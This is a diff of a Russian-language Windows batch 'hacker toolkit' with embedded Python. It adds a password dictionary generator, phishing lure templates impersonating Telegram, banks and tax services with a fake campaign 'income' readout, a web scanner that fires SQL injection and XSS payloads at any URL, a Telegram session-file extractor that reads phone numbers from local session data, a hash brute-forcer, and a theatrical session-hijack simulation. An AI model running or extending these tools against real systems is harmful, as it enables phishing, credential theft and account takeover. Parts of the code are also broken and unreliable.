+print('║      ДЕТАЛЬНАЯ WI-FI ИНФОРМАЦИЯ         ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+
+# Информация о сетевых адаптерах
+print('║  📡 СЕТЕВЫЕ АДАПТЕРЫ:                   ║')
+adapter_output = run_command('netsh wlan show interfaces')
+
+if 'Имя' in adapter_output:
+    for line in adapter_output.split('\\n'):
+        if any(key in line for key in ['Имя', 'Description', 'SSID', 'Signal']):
+            if ':' in line:
+                key, value = line.split(':', 1)
+                print(f'║  {key.strip():<15}: {value.strip()[:25]:<25} ║')
+else:
+    print('║  ⚠️  ИНФОРМАЦИЯ НЕДОСТУПНА             ║')
+
+print('║                                          ║')
+
+# Диагностика
+print('║  🔧 ДИАГНОСТИКА:                        ║')
+diag_output = run_command('netsh wlan show drivers')
+
+for line in diag_output.split('\\n'):
+    if any(key in line for key in ['Версия', 'Version', 'Тип', 'Type']):
+        if ':' in line:
+            key, value = line.split(':', 1)
+            print(f'║  {key.strip():<15}: {value.strip()[:25]:<25} ║')
+
+print('║                                          ║')
+print('║  🛡️  РЕКОМЕНДАЦИИ ПО БЕЗОПАСНОСТИ:      ║')
+print('║  • ИСПОЛЬЗУЙТЕ WPA3                     ║')
+print('║  • ОТКЛЮЧИТЕ WPS                        ║')
+print('║  • СКРЫТЬ SSID                         ║')
+print('║  • MAC ФИЛЬТРАЦИЯ                      ║')
+print('║  • СЛОЖНЫЙ ПАРОЛЬ 12+ СИМВОЛОВ         ║')
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+)
+
+if "%wifi_choice%"=="3" (
+    echo                     ║  🛠️  СОЗДАНИЕ СЛОВАРЯ...             ║
+    
+    python -c "
+import itertools
+import random
+
+print('╔══════════════════════════════════════════╗')
+print('║         ГЕНЕРАТОР СЛОВАРЕЙ              ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+print('║  📊 ТИПЫ СЛОВАРЕЙ:                      ║')
+print('║  1. ЦИФРОВОЙ (0000-9999)                ║')
+print('║  2. БУКВЕННО-ЦИФРОВОЙ (8 символов)      ║')
+print('║  3. СМЕШАННЫЙ (сложные пароли)          ║')
+print('║  4. ПЕРСОНАЛИЗИРОВАННЫЙ                 ║')
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+    
+    set /p dict_type="                     ТИП СЛОВАРЯ (1-4): "
+    set /p dict_size="                     РАЗМЕР (100-10000): "
+    set /p dict_name="                     ИМЯ ФАЙЛА: "
+    
+    python -c "
+import random
+import string
+
+dict_type = '%dict_type%'
+dict_size = int('%dict_size%')
+dict_name = '%dict_name%'
+
+common_passwords = [
+    'password', '123456', '12345678', 'qwerty', 'abc123',
+    'monkey', '1234567', 'letmein', 'trustno1', 'dragon',
+    'baseball', '111111', 'iloveyou', 'master', 'sunshine',
+    'ashley', 'bailey', 'passw0rd', 'shadow', '123123',
+    '654321', 'superman', 'qazwsx', 'michael', 'football'
+]
+
+def generate_numeric(size):
+    return [f'{i:04d}' for i in range(size)]
+
+def generate_alphanumeric(size):
+    passwords = []
+    for _ in range(size):
+        length = random.randint(6, 10)
+        password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+        passwords.append(password)
+    return passwords
+
+def generate_mixed(size):
+    passwords = common_passwords[:min(size//2, len(common_passwords))]
+    
+    special_chars = '!@#$%^&*()_+-=[]{}|;:,.<>?'
+    
+    while len(passwords) < size:
+        # Сложные пароли
+        length = random.randint(8, 12)
+        chars = string.ascii_letters + string.digits + special_chars
+        password = ''.join(random.choices(chars, k=length))
+        passwords.append(password)
+    
+    return passwords[:size]
+
+def generate_personalized(size):
+    base_words = ['admin', 'user', 'root', 'wifi', 'network', 'home', 'office']
+    passwords = []
+    
+    for _ in range(size):
+        word = random.choice(base_words)
+        number = random.randint(0, 9999)
+        special = random.choice(['!', '@', '#', '$', '%'])
+        
+        variations = [
+            f'{word}{number}',
+            f'{word}{special}',
+            f'{word}{number}{special}',
+            f'{word.capitalize()}{number}',
+            f'{word}{special}{number}'
+        ]
+        
+        passwords.append(random.choice(variations))
+    
+    return passwords
+
+print('╔══════════════════════════════════════════╗')
+print('║        СОЗДАНИЕ СЛОВАРЯ                 ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+
+if dict_type == '1':
+    passwords = generate_numeric(dict_size)
+    print(f'║  🔢 ТИП: ЦИФРОВОЙ ({dict_size} записей)       ║')
+elif dict_type == '2':
+    passwords = generate_alphanumeric(dict_size)
+    print(f'║  🔤 ТИП: БУКВЕННО-ЦИФРОВОЙ            ║')
+elif dict_type == '3':
+    passwords = generate_mixed(dict_size)
+    print(f'║  🎲 ТИП: СМЕШАННЫЙ                    ║')
+elif dict_type == '4':
+    passwords = generate_personalized(dict_size)
+    print(f'║  🎯 ТИП: ПЕРСОНАЛИЗИРОВАННЫЙ          ║')
+
+print(f'║  📁 ФАЙЛ: {dict_name:<30} ║')
+print('║                                          ║')
+print('║  📝 ГЕНЕРАЦИЯ...                         ║')
+
+# Сохранение в файл
+try:
+    with open(dict_name, 'w') as f:
+        for i, password in enumerate(passwords, 1):
+            f.write(password + '\\n')
+            
+            if i % 100 == 0:
+                progress = (i / dict_size) * 100
+                bars = '█' * int(progress / 4) + '░' * (25 - int(progress / 4))
+                print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+
+    print('║  [██████████████████████████████] 100%%   ║')
+    print(f'║  ✅ СЛОВАРЬ СОХРАНЕН: {dict_name:<20} ║')
+    print(f'║  📊 ЗАПИСЕЙ: {len(passwords):<10}            ║')
+    print(f'║  💾 РАЗМЕР: {len(passwords)*10} байт        ║')
+    
+except Exception as e:
+    print(f'║  ❌ ОШИБКА: {str(e)[:30]:<30} ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+)
+
+goto wifi_hacker
+
+:social_engineering
+call :show_title
+color 0D
 echo.
-echo ╔══════════════════════════════════════════════════════════════════════════════╗
-echo ║                          [ DECODING SESSION ]                                ║
-echo ╠══════════════════════════════════════════════════════════════════════════════╣
-echo ║                                                                              ║
-echo ║  ANALYZING ENCRYPTED DATA STREAMS...                                        ║
-timeout /t 2 /nobreak > nul
-echo ║                                                                              ║
-echo ║  [■] INTERCEPTING TELEGRAM TRAFFIC                                          ║
-timeout /t 1 /nobreak > nul
-echo ║  [■] DECRYPTING MTProto PACKETS                                             ║
-timeout /t 1 /nobreak > nul
-echo ║  [■] EXTRACTING SESSION KEYS                                                ║
-timeout /t 1 /nobreak > nul
-echo ║  [■] BYPASSING ENCRYPTION LAYERS                                            ║
-timeout /t 1 /nobreak > nul
-echo ║                                                                              ║
-echo ║  [✓] DECODING SUCCESSFUL                                                    ║
-echo ║  [✓] SESSION KEYS ACQUIRED                                                  ║
-echo ║  [✓] READY FOR AUTHENTICATION                                               ║
-echo ║                                                                              ║
-echo ╚══════════════════════════════════════════════════════════════════════════════╝
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║        СОЦИАЛЬНАЯ ИНЖЕНЕРИЯ            ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🎭 МАНИПУЛЯЦИЯ И ВЛИЯНИЕ НА ЛЮДЕЙ      ║
+echo                     ║  ⚠️  ИСПОЛЬЗУЙТЕ ОТВЕТСТВЕННО            ║
+echo                     ║                                          ║
+echo                     ║  [1] 📱 PHISHING SIMULATOR              ║
+echo                     ║  [2] 📧 EMAIL SPOOFING                  ║
+echo                     ║  [3] 🔗 СОЗДАНИЕ ФЕЙКОВЫХ САЙТОВ        ║
+echo                     ║  [4] 🎭 ПСИХОЛОГИЧЕСКИЕ ПРИЕМЫ          ║
+echo                     ║  [5] 📊 ОСОБ (OPEN SOURCE INTEL)        ║
+echo                     ║  [6] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p se_choice="                     ВЫБЕРИТЕ МЕТОД: "
+
+if "%se_choice%"=="1" goto phishing_simulator
+if "%se_choice%"=="2" goto email_spoofing
+if "%se_choice%"=="3" goto fake_sites
+if "%se_choice%"=="4" goto psychological_tricks
+if "%se_choice%"=="5" goto osint_tools
+goto hacker_tools
+
+:phishing_simulator
+echo.
+echo                     ║  🎣 PHISHING SIMULATOR                   ║
+echo                     ║                                          ║
+
+python -c "
+import random
+import time
+
+print('╔══════════════════════════════════════════╗')
+print('║         PHISHING SIMULATOR              ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+
+templates = {
+    'Telegram': {
+        'subject': '⚠️ Срочное уведомление от Telegram',
+        'body': 'Ваш аккаунт будет заблокирован через 24 часа. Для подтверждения владения аккаунтом перейдите по ссылке:',
+        'url': 'https://telegram-verify.com/login',
+        'success_rate': 0.35
+    },
+    'Bank': {
+        'subject': 'Подозрительная активность на вашем счете',
+        'body': 'Зафиксирована попытка несанкционированного доступа. Для защиты средств перейдите по ссылке:',
+        'url': 'https://bank-security-verify.ru',
+        'success_rate': 0.25
+    },
+    'Social Media': {
+        'subject': 'Ваш профиль был отмечен в публикации',
+        'body': 'Кто-то отметил вас на фотографии. Посмотреть можно по ссылке:',
+        'url': 'https://social-notify.com/view',
+        'success_rate': 0.45
+    },
+    'Government': {
+        'subject': 'Важные налоговые документы',
+        'body': 'У вас есть неоплаченные налоговые обязательства. Для уточнения деталей перейдите:',
+        'url': 'https://tax-gov-service.ru',
+        'success_rate': 0.30
+    }
+}
+
+print('║  🎯 ДОСТУПНЫЕ ШАБЛОНЫ:                  ║')
+for i, (name, template) in enumerate(templates.items(), 1):
+    print(f'║  {i}. {name:<15} - Успех: {int(template[\"success_rate\"]*100)}%% ║')
+
+print('║                                          ║')
+
+# Симуляция рассылки
+print('║  📧 СИМУЛЯЦИЯ РАССЫЛКИ...               ║')
+total_emails = random.randint(100, 1000)
+success_count = 0
+
+for i in range(1, 11):
+    time.sleep(0.3)
+    sent = i * total_emails // 10
+    template = random.choice(list(templates.values()))
+    successes = int(sent * template['success_rate'] * random.uniform(0.8, 1.2))
+    success_count += successes
+    
+    progress = i * 10
+    bars = '█' * i + '░' * (10 - i)
+    
+    print(f'║  [{bars:<10}] {progress:>3}%%       ║')
+    print(f'║  📤 ОТПРАВЛЕНО: {sent:<6}              ║')
+    print(f'║  🎯 УСПЕШНЫХ: {successes:<6}              ║')
+
+print('║                                          ║')
+print('║  📊 РЕЗУЛЬТАТЫ КАМПАНИИ:                ║')
+print(f'║  • ВСЕГО ОТПРАВЛЕНО: {total_emails:<6}       ║')
+print(f'║  • УСПЕШНЫХ: {success_count:<6}              ║')
+print(f'║  • ПРОЦЕНТ УСПЕХА: {success_count/total_emails*100:.1f}%%      ║')
+print(f'║  • ПОТЕНЦИАЛЬНЫЙ ДОХОД: ${success_count*50:<5}   ║')
+
+print('║                                          ║')
+print('║  🛡️  СОВЕТЫ ПО ЗАЩИТЕ:                  ║')
+print('║  • ПРОВЕРЯЙТЕ URL                       ║')
+print('║  • НЕ ПЕРЕХОДИТЕ ПО ССЫЛКАМ ИЗ ПОЧТЫ   ║')
+print('║  • ВКЛЮЧИТЕ 2FA                         ║')
+print('║  • ОБРАЩАЙТЕСЬ В ПОДДЕРЖКУ              ║')
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+
+echo.
 pause
-goto start
+goto phishing_simulator
+
+:web_scanner
+call :show_title
+color 0A
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║        WEB VULNERABILITY SCANNER        ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+set /p web_target="                     URL ДЛЯ СКАНИРОВАНИЯ: "
+
+if "%web_target%"=="" goto web_scanner
+
+if not "%web_target%" startswith "http" (
+    set "web_target=http://%web_target%"
+)
+
+echo                     ║                                          ║
+echo                     ║  [1] 🔍 БЫСТРОЕ СКАНИРОВАНИЕ            ║
+echo                     ║  [2] 📊 ПОЛНОЕ СКАНИРОВАНИЕ              ║
+echo                     ║  [3] 🎯 ПЕНТЕСТ МОДУЛИ                   ║
+echo                     ║  [4] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p web_scan_type="                     ВЫБЕРИТЕ ТИП: "
+
+echo.
+echo                     ║  🌐 ЗАПУСК СКАНИРОВАНИЯ %web_target%     ║
+echo                     ║                                          ║
+
+python -c "
+import requests
+import time
+import re
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor
+
+target = '%web_target%'
+parsed = urlparse(target)
+domain = parsed.netloc
+
+print('╔══════════════════════════════════════════╗')
+print('║      WEB VULNERABILITY SCAN             ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+print(f'║  🌐 ЦЕЛЬ: {target:<30} ║')
+print(f'║  🔗 ДОМЕН: {domain:<30} ║')
+print('║  ⏱️  СТАТУС: СКАНИРУЕМ...                ║')
+print('║                                          ║')
+
+# Проверка доступности
+try:
+    response = requests.get(target, timeout=10)
+    status = response.status_code
+    print(f'║  ✅ СТАТУС: {status:<10}                  ║')
+    print(f'║  📊 РАЗМЕР: {len(response.content)} байт          ║')
+    
+    # Заголовки безопасности
+    headers = response.headers
+    security_headers = ['X-XSS-Protection', 'Content-Security-Policy', 
+                       'X-Frame-Options', 'Strict-Transport-Security']
+    
+    print('║                                          ║')
+    print('║  🛡️  ЗАГОЛОВКИ БЕЗОПАСНОСТИ:            ║')
+    
+    for header in security_headers:
+        if header in headers:
+            print(f'║  ✅ {header}: {headers[header][:25]:<25} ║')
+        else:
+            print(f'║  ❌ {header}: ОТСУТСТВУЕТ              ║')
+    
+except Exception as e:
+    print(f'║  ❌ ОШИБКА: {str(e)[:30]:<30} ║')
+    print('║                                          ║')
+    print('╚══════════════════════════════════════════╝')
+    exit()
+
+print('║                                          ║')
+
+# Поиск уязвимостей
+vulnerabilities = []
+print('║  🔍 ПОИСК SQL INJECTION...               ║')
+
+sql_payloads = [\"'\", \"' OR '1'='1\", \"' UNION SELECT null,version()--\"]
+for payload in sql_payloads:
+    test_url = f\"{target}?id={payload}\"
+    try:
+        resp = requests.get(test_url, timeout=5)
+        if any(error in resp.text.lower() for error in ['sql', 'syntax', 'mysql', 'ora-']):
+            vulnerabilities.append(('SQLi', test_url))
+            break
+    except:
+        pass
+
+print('║  🔍 ПОИСК XSS...                         ║')
+xss_payloads = ['<script>alert(1)</script>', '\"><script>alert(1)</script>']
+for payload in xss_payloads:
+    test_url = f\"{target}?q={payload}\"
+    try:
+        resp = requests.get(test_url, timeout=5)
+        if payload in resp.text:
+            vulnerabilities.append(('XSS', test_url))
+            break
+    except:
+        pass
+
+print('║  🔍 ПОИСК ДИРЕКТОРИЙ...                  ║')
+common_dirs = ['/admin', '/phpmyadmin', '/wp-admin', '/backup', '/config']
+for directory in common_dirs:
+    test_url = f\"{target}{directory}\"
+    try:
+        resp = requests.get(test_url, timeout=3)
+        if resp.status_code == 200:
+            vulnerabilities.append(('Open Dir', test_url))
+    except:
+        pass
+
+print('║                                          ║')
+print('║  📊 РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ:            ║')
+
+if vulnerabilities:
+    print(f'║  ⚠️  НАЙДЕНО УЯЗВИМОСТЕЙ: {len(vulnerabilities)}          ║')
+    for vuln_type, url in vulnerabilities[:3]:
+        print(f'║  • {vuln_type:<15}: {url[:30]:<30} ║')
+    if len(vulnerabilities) > 3:
+        print(f'║  • ... и еще {len(vulnerabilities)-3} уязвимостей  ║')
+else:
+    print('║  ✅ УЯЗВИМОСТЕЙ НЕ НАЙДЕНО           ║')
+
+print('║                                          ║')
+
+# Рекомендации
+print('║  💡 РЕКОМЕНДАЦИИ ПО БЕЗОПАСНОСТИ:       ║')
+print('║  • ИСПОЛЬЗУЙТЕ WAF                      ║')
+print('║  • ОБНОВЛЯЙТЕ CMS И ПЛАГИНЫ             ║')
+print('║  • НАСТРОЙТЕ CSP                        ║')
+print('║  • РЕГУЛЯРНЫЕ ПЕНТЕСТЫ                  ║')
+print('║  • ЛОГИРУЙТЕ ЗАПРОСЫ                    ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+
+# Сохранение отчета
+if vulnerabilities:
+    with open('starflow_web_scan.txt', 'w') as f:
+        f.write(f'Scan Report for {target}\\n')
+        f.write(f'Date: {time.ctime()}\\n')
+        f.write(f'Vulnerabilities found: {len(vulnerabilities)}\\n\\n')
+        for vuln_type, url in vulnerabilities:
+            f.write(f'{vuln_type}: {url}\\n')
+    print('╔══════════════════════════════════════════╗')
+    print('║  💾 ОТЧЕТ СОХРАНЕН: starflow_web_scan.txt ║')
+    print('╚══════════════════════════════════════════╝')
+"
+
+echo.
+pause
+goto web_scanner
+
+:data_dumper
+call :show_title
+color 0B
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║            DATA DUMPER                  ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  💾 ИЗВЛЕЧЕНИЕ И АНАЛИЗ ДАННЫХ          ║
+echo                     ║                                          ║
+echo                     ║  [1] 📱 TELEGRAM DATA EXTRACTOR         ║
+echo                     ║  [2] 🌐 BROWSER DATA DUMP               ║
+echo                     ║  [3] 📧 EMAIL DATABASE PARSER           ║
+echo                     ║  [4] 📁 FILE CARVING                    ║
+echo                     ║  [5] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p dump_choice="                     ВЫБЕРИТЕ ИСТОЧНИК: "
+
+if "%dump_choice%"=="1" (
+    echo                     ║  📱 ЗАПУСК TELEGRAM DATA EXTRACTOR... ║
+    
+    python -c "
+import os
+import json
+import sqlite3
+import shutil
+from datetime import datetime
+
+print('╔══════════════════════════════════════════╗')
+print('║      TELEGRAM DATA EXTRACTOR            ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+
+# Поиск файлов Telegram
+telegram_paths = [
+    os.path.expanduser('~/AppData/Roaming/Telegram Desktop'),
+    os.path.expanduser('~/.local/share/TelegramDesktop'),
+    'C:/Users/Public/Telegram Desktop'
+]
+
+found_sessions = []
+for path in telegram_paths:
+    if os.path.exists(path):
+        # Поиск session файлов
+        for root, dirs, files in os.walk(path):
+            for file in files:
+                if file.endswith('.session'):
+                    found_sessions.append(os.path.join(root, file))
+                elif file.endswith('.json'):
+                    found_sessions.append(os.path.join(root, file))
+
+if found_sessions:
+    print(f'║  ✅ НАЙДЕНО СЕССИЙ: {len(found_sessions)}          ║')
+    
+    for i, session in enumerate(found_sessions[:5], 1):
+        size = os.path.getsize(session) if os.path.exists(session) else 0
+        print(f'║  {i}. {os.path.basename(session)[:20]:<20} - {size} байт ║')
+    
+    if len(found_sessions) > 5:
+        print(f'║  ... и еще {len(found_sessions)-5} сессий       ║')
+    
+    # Экспорт данных
+    export_data = []
+    for session in found_sessions[:3]:
+        try:
+            if session.endswith('.json'):
+                with open(session, 'r') as f:
+                    data = json.load(f)
+                    if 'phone' in data:
+                        export_data.append({
+                            'file': os.path.basename(session),
+                            'phone': data.get('phone', 'N/A'),
+                            'auth_key': 'PRESENT' if data.get('auth_key') else 'MISSING'
+                        })
+        except:
+            pass
+    
+    if export_data:
+        print('║                                          ║')
+        print('║  📊 ИЗВЛЕЧЕННЫЕ ДАННЫЕ:                 ║')
+        for data in export_data:
+            print(f'║  • {data[\"file\"]:<15}: {data[\"phone\"][:15]:<15} ║')
+    
+    # Сохранение отчета
+    with open('starflow_telegram_dump.txt', 'w') as f:
+        f.write('Telegram Data Dump Report\\n')
+        f.write(f'Generated: {datetime.now()}\\n')
+        f.write(f'Sessions found: {len(found_sessions)}\\n\\n')
+        for session in found_sessions:
+            f.write(f'{session}\\n')
+    
+    print('║                                          ║')
+    print('║  💾 ОТЧЕТ СОХРАНЕН:                     ║')
+    print('║    starflow_telegram_dump.txt           ║')
+    
+else:
+    print('║  ❌ СЕССИИ TELEGRAM НЕ НАЙДЕНЫ        ║')
+
+print('║                                          ║')
+print('║  💡 РЕКОМЕНДАЦИИ ПО БЕЗОПАСНОСТИ:       ║')
+print('║  • ИСПОЛЬЗУЙТЕ 2FA В TELEGRAM           ║')
+print('║  • РЕГУЛЯРНО УДАЛЯЙТЕ СЕССИИ            ║')
+print('║  • НЕ ХРАНИТЕ СЕССИИ НА ОБЩЕСТВЕННЫХ ПК ║')
+print('║  • ИСПОЛЬЗУЙТЕ БИОМЕТРИЧЕСКУЮ БЛОКИРОВКУ ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+)
+
+echo.
+pause
+goto data_dumper
+
+:password_cracker
+call :show_title
+color 0C
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          PASSWORD CRACKER               ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  🔓 РАСШИФРОВКА И ПОДБОР ПАРОЛЕЙ        ║
+echo                     ║                                          ║
+echo                     ║  [1] 🔢 HASH CRACKER                    ║
+echo                     ║  [2] 📁 ARCHIVE PASSWORD RECOVERY       ║
+echo                     ║  [3] 📄 PDF/DOC PASSWORD REMOVER        ║
+echo                     ║  [4] 🔐 WINDOWS PASSWORD DUMP           ║
+echo                     ║  [5] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p crack_choice="                     ВЫБЕРИТЕ ТИП: "
+
+if "%crack_choice%"=="1" (
+    echo                     ║  🔢 HASH CRACKER                        ║
+    echo                     ║                                          ║
+    
+    echo                     ║  ВВЕДИТЕ HASH:                          ║
+    set /p hash_input="                     HASH: "
+    
+    if "%hash_input%"=="" goto password_cracker
+    
+    python -c "
+import hashlib
+import time
+
+hash_input = '%hash_input%'
+hash_length = len(hash_input)
+
+print('╔══════════════════════════════════════════╗')
+print('║            HASH ANALYZER                ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+print(f'║  🔢 HASH: {hash_input:<32} ║')
+print(f'║  📏 ДЛИНА: {hash_length} символов           ║')
+
+# Определение типа хеша
+hash_types = {
+    32: 'MD5',
+    40: 'SHA-1',
+    64: 'SHA-256',
+    56: 'SHA-224',
+    96: 'SHA-384',
+    128: 'SHA-512'
+}
+
+hash_type = hash_types.get(hash_length, 'UNKNOWN')
+print(f'║  🎯 ТИП: {hash_type:<30} ║')
+
+print('║                                          ║')
+print('║  🔍 АНАЛИЗ HASH...                       ║')
+
+# Простые проверки
+common_passwords = ['password', '123456', 'admin', 'qwerty', 'letmein']
+found = False
+
+for password in common_passwords:
+    # Проверка MD5
+    md5_hash = hashlib.md5(password.encode()).hexdigest()
+    if md5_hash == hash_input:
+        print(f'║  🎉 НАЙДЕНО: {password:<30} ║')
+        print(f'║  🔗 MD5: {md5_hash:<32} ║')
+        found = True
+        break
+    
+    # Проверка SHA-1
+    sha1_hash = hashlib.sha1(password.encode()).hexdigest()
+    if sha1_hash == hash_input:
+        print(f'║  🎉 НАЙДЕНО: {password:<30} ║')
+        print(f'║  🔗 SHA-1: {sha1_hash:<32} ║')
+        found = True
+        break
+
+if not found:
+    print('║  🔄 ЗАПУСК BRUTE FORCE...               ║')
+    
+    # Имитация брутфорса
+    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
+    total_combinations = len(chars) ** 4  # Для 4 символов
+    
+    for i in range(min(1000, total_combinations)):
+        # Генерация тестовой строки
+        test_str = ''
+        n = i
+        for _ in range(4):
+            test_str = chars[n % len(chars)] + test_str
+            n //= len(chars)
+        
+        # Проверка хешей
+        test_md5 = hashlib.md5(test_str.encode()).hexdigest()
+        test_sha1 = hashlib.sha1(test_str.encode()).hexdigest()
+        
+        if test_md5 == hash_input or test_sha1 == hash_input:
+            print(f'║  🎉 НАЙДЕНО: {test_str:<30} ║')
+            found = True
+            break
+        
+        if i % 100 == 0:
+            progress = (i / min(1000, total_combinations)) * 100
+            bars = '█' * int(progress / 4) + '░' * (25 - int(progress / 4))
+            print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+            print(f'║  🔄 ПРОВЕРЕНО: {i:<6}              ║')
+
+if not found:
+    print('║  ❌ ПАРОЛЬ НЕ НАЙДЕН                  ║')
+    print('║  💡 РЕКОМЕНДАЦИИ:                   ║')
+    print('║  • ИСПОЛЬЗУЙТЕ RAINBOW TABLES        ║')
+    print('║  • GPU ACCELERATED CRACKING          ║')
+    print('║  • CLOUD CRACKING SERVICES           ║')
+
+print('║                                          ║')
+print('║  🛡️  СОВЕТЫ ПО БЕЗОПАСНОСТИ:           ║')
+print('║  • ИСПОЛЬЗУЙТЕ СОЛЬ (SALT)               ║')
+print('║  • ИСПОЛЬЗУЙТЕ bcrypt/scrypt/argon2      ║')
+print('║  • ДЛИННЫЕ СЛОЖНЫЕ ПАРОЛИ               ║')
+print('║  • МЕНЯЙТЕ ПАРОЛИ РЕГУЛЯРНО             ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+
+# Сохранение результата
+if found:
+    with open('starflow_hash_cracked.txt', 'a') as f:
+        f.write(f'{hash_input} -> {password}\\n')
+    print('╔══════════════════════════════════════════╗')
+    print('║  💾 РЕЗУЛЬТАТ СОХРАНЕН                  ║')
+    print('╚══════════════════════════════════════════╝')
+"
+)
+
+echo.
+pause
+goto password_cracker
+
+:telegram_exploit
+call :show_title
+color 0D
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║      TELEGRAM EXPLOIT TOOLKIT           ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  📱 ИНСТРУМЕНТЫ ДЛЯ TELEGRAM            ║
+echo                     ║                                          ║
+echo                     ║  [1] 📡 SESSION HIJACKING               ║
+echo                     ║  [2] 🔢 CODE INTERCEPTION               ║
+echo                     ║  [3] 📨 MESSAGE SNIFFER                 ║
+echo                     ║  [4] 👥 CONTACT GRABBER                 ║
+echo                     ║  [5] 📊 STATISTICS COLLECTOR            ║
+echo                     ║  [6] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p tg_exploit_choice="                     ВЫБЕРИТЕ ИНСТРУМЕНТ: "
+
+if "%tg_exploit_choice%"=="1" (
+    echo                     ║  📡 SESSION HIJACKING SIMULATOR       ║
+    
+    python -c "
+import random
+import time
+from datetime import datetime
+
+print('╔══════════════════════════════════════════╗')
+print('║      TELEGRAM SESSION HIJACKING        ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+print('║  📱 ТИПЫ АТАК:                          ║')
+print('║  1. SESSION FILE THEFT                  ║')
+print('║  2. MITM (MAN IN THE MIDDLE)           ║')
+print('║  3. DESKTOP COMPROMISE                  ║')
+print('║  4. MOBILE MALWARE                      ║')
+print('║                                          ║')
+
+attack_type = random.choice(['SESSION_FILE', 'MITM', 'DESKTOP', 'MOBILE'])
+print(f'║  🎯 ВЫБРАННАЯ АТАКА: {attack_type:<20} ║')
+
+print('║                                          ║')
+print('║  🔄 СИМУЛЯЦИЯ АТАКИ...                  ║')
+
+stages = [
+    'СКАНИРОВАНИЕ ЦЕЛИ',
+    'ПОИСК УЯЗВИМОСТЕЙ',
+    'ЭКСПЛУАТАЦИЯ',
+    'ПОЛУЧЕНИЕ ДОСТУПА',
+    'СОХРАНЕНИЕ СЕССИИ'
+]
+
+for i, stage in enumerate(stages, 1):
+    time.sleep(1)
+    progress = (i / len(stages)) * 100
+    bars = '█' * int(progress / 20) + '░' * (5 - int(progress / 20))
+    
+    print(f'║  [{bars:<5}] {progress:>3}%% - {stage:<25} ║')
+    
+    if i == len(stages):
+        # Результат
+        success = random.choice([True, False])
+        if success:
+            phone = f'+7{random.randint(900, 999)}{random.randint(1000000, 9999999)}'
+            user_id = random.randint(100000000, 999999999)
+            
+            print('║                                          ║')
+            print('║  🎉 СЕССИЯ ЗАХВАЧЕНА!                    ║')
+            print(f'║  📱 НОМЕР: {phone:<30} ║')
+            print(f'║  🆔 USER ID: {user_id:<28} ║')
+            print(f'║  📅 ВРЕМЯ: {datetime.now().strftime(\"%H:%M:%S\"):<28} ║')
+            print(f'║  💾 ФАЙЛ: tdata_{user_id}.session        ║')
+            
+            # Сохранение информации
+            with open('starflow_tg_sessions.txt', 'a') as f:
+                f.write(f'{datetime.now()} | {phone} | {user_id} | {attack_type}\\n')
+            
+            print('║                                          ║')
+            print('║  💾 ИНФОРМАЦИЯ СОХРАНЕНА:               ║')
+            print('║    starflow_tg_sessions.txt             ║')
+        else:
+            print('║                                          ║')
+            print('║  ❌ АТАКА ПРОВАЛИЛАСЬ                    ║')
+            print('║  ⚠️  ПРИЧИНЫ:                           ║')
+            print('║    • 2FA АКТИВИРОВАН                    ║')
+            print('║    • FIREWALL БЛОКИРОВКА                ║')
+            print('║    • ОБНОВЛЕННАЯ ВЕРСИЯ                 ║')
+
+print('║                                          ║')
+print('║  🛡️  ЗАЩИТА ОТ SESSION HIJACKING:       ║')
+print('║  • ВКЛЮЧИТЕ 2FA В TELEGRAM              ║')
+print('║  • РЕГУЛЯРНО УДАЛЯЙТЕ СЕССИИ            ║')
+print('║  • НЕ ХРАНИТЕ SESSION FILES В ОБЛАКЕ    ║')
+print('║  • ИСПОЛЬЗУЙТЕ АНТИВИРУС                ║')
+print('║  • ПРОВЕРЯЙТЕ АКТИВНЫЕ СЕССИИ           ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+)
+
+echo.
+pause
+goto telegram_exploit
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         СИСТЕМНЫЕ УТИЛИТЫ                                 ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:system_utils
